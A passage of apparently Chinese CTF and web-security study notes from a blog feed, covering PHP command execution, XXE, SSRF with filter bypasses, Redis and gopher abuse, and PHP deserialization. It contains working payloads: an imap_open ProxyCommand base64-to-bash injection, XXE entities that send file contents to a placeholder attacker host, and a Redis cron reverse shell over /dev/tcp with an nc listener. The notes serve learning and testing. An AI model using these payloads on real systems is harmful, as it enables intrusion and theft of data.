operator">=</span> <span class="token variable">$wsh</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd /c"</span><span class="token punctuation">.</span> <span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//调用对象方法来执行命令</span>    <span class="token variable">$stdout</span> <span class="token operator">=</span> <span class="token variable">$exec</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">StdOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>    <span class="token variable">$stroutput</span> <span class="token operator">=</span> <span class="token variable">$stdout</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$stroutput</span><span class="token punctuation">;</span>    <span class="token delimiter">?></span></code></pre><p>​    </p><ul><li><p>pcntl扩展： <code>pcntl_exec()</code></p></li><li><p><code>imap_open()</code></p><ul><li>公开的exp：</li></ul></li></ul><pre class=" language-php"><code class="language-php">    <span class="token delimiter">&lt;?php</span>    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string">"echo fsfasaf |tee / tmp/2. txt"</span> <span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//fsfasaf 替换为命令</span>    <span class="token variable">$encoded</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span> <span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mailbox</span> <span class="token operator">=</span> <span class="token string">"any -o ProxyCommand=echo\t"</span> <span class="token punctuation">.</span> <span class="token variable">$encoded</span><span class="token punctuation">.</span><span class="token string">" |base64\t-d |bash"</span> <span class="token punctuation">;</span>    @<span class="token function">imap_open</span><span class="token punctuation">(</span><span class="token string">'{'</span><span class="token punctuation">.</span><span class="token variable">$mailbox</span><span class="token punctuation">.</span><span class="token string">'}:143/imap}INBOX'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter">?></span>    <span class="token comment" spellcheck="true">//ProxyCommand是ssh的一个内容</span></code></pre><ul><li><p><code>LD_PRELOAD</code>：</p><ul><li>LD_PRELOAD是Linux采统的-一个环境变量，它可以影响程序的运行时的链接(Runtime linker)，它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，<strong>我们可以以此功能来使用自己的或是更好的函数</strong>(无需别人的源码)，<strong>而另一方面，我们也可以以向别人的程序注入程序，从而达特定的目的。</strong></li></ul></li></ul><p>####8. 源码获取</p><ul><li>右键源代码</li><li>代码压缩包泄漏</li><li>.git源码<br><a href="https://github.com/ijjejie/GitHack" target="_blank" rel="noopener">https://github.com/ijjejie/GitHack</a></li><li>.DS_ Store泄漏（mac下的漏洞）<br><a href="https://github.com/ijiejie/ds" target="_blank" rel="noopener">https://github.com/ijiejie/ds</a>_ store_exp</li><li>SVN代码泄漏<br><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">https://github.com/kost/dvcs-ripper</a></li><li>敏感信息<ul><li>Robots.txt</li></ul></li><li>备份文件<ul><li>Index.php.bak</li><li>Index.php.swp</li></ul></li></ul><h4 id="9-扫描相关"><a href="#9-扫描相关" class="headerlink" title="9.扫描相关"></a>9.扫描相关</h4><ul><li>dirsearch</li></ul><h4 id="10-FUZZ"><a href="#10-FUZZ" class="headerlink" title="10.FUZZ"></a>10.FUZZ</h4><pre class=" language-php"><code class="language-php">  <span class="token delimiter">&lt;?php</span>  <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span>  <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span> <span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span> <span class="token string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">show_source</span> <span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token variable">$action</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//payload ： ?arg=}phpinfo();/*&amp;action=create_function</span></code></pre><pre><code>  &lt;?php  $a = &#39;}phpinfo();/*&#39;;  create_function(&quot;&quot;,$a);  ?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2020/03/26/xxe/"/>
      <url>/2020/03/26/xxe/</url>
      
        <content type="html"><![CDATA[<h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><h4 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h4><ul><li><p>XXE漏洞全称XML External Entity Injection， 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击<br>内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p></li><li><p>触发点：可上传xml文件，并且没有过滤</p></li></ul><h4 id="2-XML基础知识"><a href="#2-XML基础知识" class="headerlink" title="2.XML基础知识"></a>2.XML基础知识</h4><ul><li><p>XML指可扩展标记语言( Extensible Markup Language)，XML被设计用来传输和存储数据。</p></li><li><p>XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构</p></li><li><p>语法规则: .</p><ul><li><p>XML文档必须有一个根元素</p></li><li><p>XML元素都必须有一个关闭标签</p><table><thead><tr><th>&amp;lt;</th><th>&lt;</th><th>（小于号）</th></tr></thead><tbody><tr><td>&amp;gt;</td><td>&gt;</td><td>（大于号）</td></tr><tr><td>&amp;amp;</td><td>&amp;</td><td>（和号）</td></tr><tr><td>&amp;apos;</td><td><code>……</code></td><td>（省略号）</td></tr><tr><td>&amp;quot;</td><td><code>&quot;</code></td><td>（双引号）</td></tr></tbody></table></li></ul></li></ul><ul><li><p>XML标签对大小敏感（前后标签必须大小写一致）</p></li><li><p>XML元秦必须被正确的嵌套</p></li><li><p>XML属性值必须加引号</p></li><li><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span><span class="token comment" spellcheck="true">&lt;!--  这是注释 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span> Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>    //<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hello</span><span class="token punctuation">></span></span> 2>1 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hello</span><span class="token punctuation">></span></span>   //这个“大于号>”不会产生错误    //<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>haha</span><span class="token punctuation">></span></span> 1&lt;2 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>haha</span><span class="token punctuation">></span></span>     //这个小于号会产生错误，会被识别为标签开始的地方，所以有些字符需要用其他方法代替<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting! <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span></code></pre></li></ul><ul><li><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE mail[&lt;!ELEMENT mail (message)></span>&lt;!ENTITY hacker SYSTEM "file:///C:/Windows/win.ini">]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mail</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span><span class="token entity" title="&hacker;">&amp;hacker;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mail</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 这是一个包含本地文件的例子，通过file进行本地文件包含--></span></code></pre></li><li><p>与file类似的协议：</p><table><thead><tr><th>libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file、http、ftp</td><td>file、http、ftp</td><td>file、http、ftp</td><td>file、http、ftp</td></tr><tr><td></td><td>php、compress.zlib、compress.bzip2、data、glob、phar</td><td>https、jar、netdoc、mailto、gopher</td><td>https</td></tr></tbody></table></li><li><p>加了扩展之后支持的协议增加</p><table><thead><tr><th>Scheme</th><th>Extension Required</th></tr></thead><tbody><tr><td>https、ftps</td><td>OpenSSL</td></tr><tr><td>zip</td><td>zip</td></tr><tr><td>ssh2.shell<br/>ssh2.exec<br/>ssh2.tunnel<br/>ssh2.sftp<br/>ssh2.scp</td><td>ssh2</td></tr><tr><td>rar</td><td>rar</td></tr><tr><td>ogg</td><td>oggvorbis</td></tr><tr><td>expect</td><td>expect</td></tr></tbody></table></li></ul><h4 id="3-DTD（文档类型定义）"><a href="#3-DTD（文档类型定义）" class="headerlink" title="3.DTD（文档类型定义）"></a>3.DTD（文档类型定义）</h4><ul><li><p>DTD (文档类型定义)的作用是定义XML文档的合法构建模块。DTD可以在XML文档内声明，也可以外部引用。</p></li><li><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype">&lt;!DOCTYPE note[    &lt;!ELEMENT note (to, from , heading, body)></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span>        <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>         <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span>         <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>]><span class="token comment" spellcheck="true">&lt;!-- &lt;!DOCTYPE note[]>  这个是内部声明语句，note是根元素，[]内的是元素声明，都可自定义 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span> John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting !<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- PCDATA 的意思是被解析的字符数据。PCDATA是会被解析器解释的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当做标记来处理，而实体会被展开 --></span></code></pre></li></ul><h4 id="4-参数实体"><a href="#4-参数实体" class="headerlink" title="4.参数实体"></a>4.参数实体</h4><ul><li><p>参数实体只用于DTD和文档的内部子集中，XML的规范定义中，只有在DTD中才能引用参数实体。参数实体的声明和引用都是以百分号%。并且参数实体的引用在DTD是理解解析的，替换文本将变成DTD的一部分。 该类型的实体用“%”字符(或十六进制编码的%)声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容</p></li><li><pre class=" language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ELEMENT root (message)>    <!ENTITY % param1 "<!ENTITY internal 'http://xxx.com'>">  <!--此处定义-->    %param1;   <!--此处引用-->]><root><messager>&internal; </message></root><!-- 可直接使用此demo去尝试，修改internal处的值即可--></code></pre></li><li><p>无回显简单利用</p><pre class=" language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0" encoding=”utf-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % evil SYSTEM "file:///E:/phpstudy/WWW/bull/xxe/xml/flag.txt"><!ENTITY % xxe SYSTEM "http://xx.xx.xx.xx/bull/xxe/xml/dtd7_2.xm1">%xxe ;%all ;]>< foo>&send;</foo><!--包含的第一个文件的内容-->flag<!--包含的第二个文件的内容--><!ENTITY % all "<!ENTITY send SYSTEM 'http://xx.xx.xx.xx/class/XSS_get_cookie/hacker.php?cookie=%evil;'>"><!--一个实体之中不允许引用另一个实体，所以第二个文件的内容不能直接写进去，必须使用引用的方法--><!--SYSTEM意思的远程展露，类似于主动获取请求--></code></pre></li></ul><h4 id="5-XXE题目"><a href="#5-XXE题目" class="headerlink" title="5.XXE题目"></a>5.XXE题目</h4><ul><li><p><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p><ul><li>题目描述:</li><li>请设法获得目标机器/hqme/ctf/flag.txt中的flag值</li><li>（这种题目一般会告诉你flag在哪里）</li></ul></li><li><p>铺垫内容</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//使用SimpLeXMLELement进行实例化，对xml文件处理的php函数</span><span class="token operator">&lt;</span> <span class="token operator">?</span>php<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');   //读取一个文件</span>    <span class="token shell-comment comment">#$xml = simplexml_load_string($data);</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpLeXMLELement</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$xml</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"key:"</span><span class="token punctuation">.</span><span class="token variable">$key</span><span class="token punctuation">.</span><span class="token string">"value:"</span><span class="token punctuation">.</span><span class="token variable">$value</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token shell-comment comment">#var_dump($xml);</span><span class="token delimiter">?></span></code></pre></li><li><pre class=" language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % send SYSTEM 'http://xx.xx.xx.xx/xxe.dtd'> %send;%test;%back;]><!-- --></code></pre></li><li><pre class=" language-xml-dtd"><code class="language-xml-dtd"><!--其中，xxe.dtd的内容：--><IENTITY % file SYSTEM "php:// fllter/read-convert.base64-encode/resource-file:///var/www/html/flag.php"> <!ENTITY % test "<!ENTITY &#37;  back  SYSTEM 'http://xx.xx.xx.xx:2333/7file-%file;'>">//攻击机是xx.xx.xx.xx，用nc -lvp 监听2333口就可以了</code></pre></li></ul><h4 id="6-注意"><a href="#6-注意" class="headerlink" title="6.注意"></a>6.注意</h4><ul><li>实体中嵌入实体，%不能出现，所以要使用<code>&amp;#x25</code>、 <code>&amp;#37</code>去代替</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2020/03/26/ssrf/"/>
      <url>/2020/03/26/ssrf/</url>
      
        <content type="html"><![CDATA[<h3 id="7-SSRF-服务器段请求伪造"><a href="#7-SSRF-服务器段请求伪造" class="headerlink" title="7. SSRF 服务器段请求伪造"></a>7. SSRF 服务器段请求伪造</h3><h4 id="1-场景"><a href="#1-场景" class="headerlink" title="1.场景"></a>1.场景</h4><ul><li>公司服务器——公司内部机器。我们最多访问能到服务器，而进不了内网，不能对内网机器进行访问</li><li>如果，让服务器自己通过内网访问内网机器。就可以进行其他操作</li><li>服务器必须能对外发请求才可以</li><li>类似于  百度翻译这样的  能够翻译网站的工具   其实都是服务器自己去请求这个网站，然后翻译</li></ul><h4 id="2-危害"><a href="#2-危害" class="headerlink" title="2.危害"></a>2.危害</h4><h4 id="3-漏洞判断"><a href="#3-漏洞判断" class="headerlink" title="3.漏洞判断"></a>3.漏洞判断</h4><ul><li>在输入处输入  链接、地址<ul><li>回显</li><li>延时</li><li>dns请求（cyce.io）</li></ul></li><li>再用  <code>url=http://localhost/</code>进行测试：能不能访问内网</li></ul><h4 id="4-相关函数"><a href="#4-相关函数" class="headerlink" title="4.相关函数"></a>4.相关函数</h4><ul><li>file_get_content：该函数可以读取url指向的文件（对外发起请求）</li><li>fsockopen ：打开一个网络链接或者unic套接字链接</li><li>curl_exec：调用curl服务，curl支持的协议与他的版本有关，可以在phpinfo中查到curl支持的协议</li><li>dict:// 功能与curl一样  ：curl 127.0.0.1:3306  == dict://127.0.0.1:3306</li><li>Gopher</li></ul><h4 id="5-绕过IP限制"><a href="#5-绕过IP限制" class="headerlink" title="5.绕过IP限制"></a>5.绕过IP限制</h4><p>服务器发出请求时，如果做了IP限制，可以用一下方法尝试绕过</p><ul><li>添加端口（添加80端口，绕过正则匹配）</li><li>在地址后加无用参数：<code>127.0.0.1?a=fghjkbnm</code></li><li>短网址：指向某网址</li><li>指向任意ip的域名，示例网址：<code>xip.io</code></li><li>IP限制绕过 ：127.0.0.1<ul><li>十六进制转换  <code>127.0.0.1</code> == <code>0x7f.0.0.1</code> == <code>0x7f000001(用0代替点)</code></li><li>八进制转换  <code>127.0.0.1</code> == <code>0177.0.0.1</code></li><li>十进制转换  <code>0x7f000001</code> == <code>2130706433</code></li><li>不同进制组合转换</li></ul></li><li>特殊（不常用）：<code>www.baidu.com@127.0.0.1</code> ：使用<code>www.baidu.com</code>的身份登录到127.0.0.1</li></ul><h4 id="6-Gopher协议"><a href="#6-Gopher协议" class="headerlink" title="6.Gopher协议"></a>6.Gopher协议</h4><ul><li>Gopher是一个互联网上使用的分布型的文件搜集获取网络协议，Gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合Gopher协议的请求。Gopher协议是 ssrf 利用中一个最强大的协议（俗称万能协议）</li><li>具体协议内容及格式请百度</li></ul><ul><li><p>Gopher 对Redis的应用：</p><ul><li><p>通过ssrf –&gt;  gopher  调用Redis（没密码），去写一个 corn 定时任务，反弹shell</p></li><li><p>使用Redis反弹shell：</p><pre class=" language-shell"><code class="language-shell">#  redis-cli -h aa.aa.aa.aa   //连接主机>  set shell "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/bb.bb.bb.bb/5765 0>&1\n\n"     //反弹shell的代码>  config set dir /var/spool/cron  //创建定时任务>  config set dbfilename root      //配置root数据库>  save >  quit</code></pre></li></ul></li><li><p>另一个主机去监听</p></li></ul><pre class=" language-shell"><code class="language-shell">      nc -v -l -p 5765      //我是攻击者bb.bb.bb.bb</code></pre><ul><li>补充cron的用法：</li></ul><pre><code>      corn 的语法:       [分] [时] [日] [月] [周] command      -  表示一个范围      *  表示所有可能的值      ,  列表范围      /  指定间隔频率      */1 * * * * command   ：表示每个1分钟执行一次command      59 23 1 5 * command   ：表示每年的5月1号23点59分执行一次command</code></pre><p>​    </p><h4 id="7-Gopher对MySQL的利用"><a href="#7-Gopher对MySQL的利用" class="headerlink" title="7.Gopher对MySQL的利用"></a>7.Gopher对MySQL的利用</h4><ul><li><p>完成前面的ssrf探测：ip138.com、ceye.io等方法，发现存在ssrf，确认了MySQL无密码</p></li><li><p>协议转化</p></li></ul><pre><code>  curl &quot;gopher://127.0.0.1:3306/_    //使用curl以外的类似命令也可以  +url编码的登入请求  //通过wireshark抓取mysql的登录包得到  +包长度（下一句开始到最后一个字符的长度）  +%00%00%00%03  +查询语句（url编码）  +%01%00%00%00%01&quot;  //直接用脚本生成  https://github.com/tarunkant/Gopherus</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2020/03/26/fan-xu-lie-hua/"/>
      <url>/2020/03/26/fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="1-概念："><a href="#1-概念：" class="headerlink" title="1.概念："></a>1.概念：</h4><pre><code>数据(变量)序列化(持久化)，将一个变量的数据&quot;转换为&quot;字符串，但并不是类型转换，目的是将该字符串</code></pre><p>存储在本地。相反的行为称为反序列化。序列化和反序列化的目的是使得程序间传输对象会更加方便。</p><ul><li>序列化：内存数据是“稍纵即逝”的；——通常， 程序执行结束，立即全部销毁。<ul><li>变量所存储的数据，就是内存数据；文件是“持久数据”；</li><li>序列化就是将内存的变量数据，“保存”到文件中的持久数据的过程。简化就是:将内存变为文件；</li></ul></li><li>反序列化：<ul><li>就是将序列化过存储到文件中的数据，恢复到程序代码的变量表示形式的过程。简化就是:将文件变为内存。</li></ul></li></ul><h4 id="2-相关函数"><a href="#2-相关函数" class="headerlink" title="2.相关函数"></a>2.相关函数</h4><ul><li><p>序列化：<code>serialize(mixed $value):string</code></p></li><li><p>反序列化：<code>unserialize(string $str):mixed</code></p></li></ul><h4 id="3-代码理解"><a href="#3-代码理解" class="headerlink" title="3.代码理解"></a>3.代码理解</h4><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对于php中类的理解：</span><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">test_class</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//变量</span>    <span class="token keyword">public</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string">'nihao'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//function</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">print_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//创建对象</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test_class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用方法</span><span class="token variable">$object</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">print_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li>序列化理解：</li></ul><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//序列化结果理解：</span><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">user</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//变量</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#private $name2 =</span><span class="token string">'leo'</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#protected $age2 = 19;</span>    <span class="token comment" spellcheck="true">//方法</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">print_data</span><span class="token punctuation">(</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span><span class="token string">'is'</span><span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">.</span> <span class="token string">'years old&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//创建对象</span><span class="token variable">$usr</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//赋值</span><span class="token variable">$usr</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span><span class="token variable">$usr</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span><span class="token string">'Leo'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出</span><span class="token variable">$usr</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">print_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//输出序列化后的数据</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$usr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span class="token comment" spellcheck="true">//输出的结果：Leo is 18 years old</span><span class="token comment" spellcheck="true">//序列化的结果：O:4:"user":2:{s:3:"age";i:18;s:4:"name";s:3:"Leo";}</span><span class="token comment" spellcheck="true">//只要有序列和那个类模板就能恢复数据</span></code></pre><img src="https://gitee.com/lingying177/blogimage/raw/master/img/CTF/序列化.png" style="zoom:50%;" /><ul><li>反序列化的理解：</li></ul><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//反序列化后获取变量</span><span class="token comment" spellcheck="true">//需要模板对象和序列</span><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">user</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//变量</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span><span class="token string">''</span> <span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//方法</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">print_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span><span class="token string">'is'</span><span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">.</span> <span class="token string">'years old&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//重建对象</span><span class="token variable">$usr</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">'O:4:"user":2:{s:3:"age";i:18;s:4:"name";s:3:"Leo";}'</span><span class="token 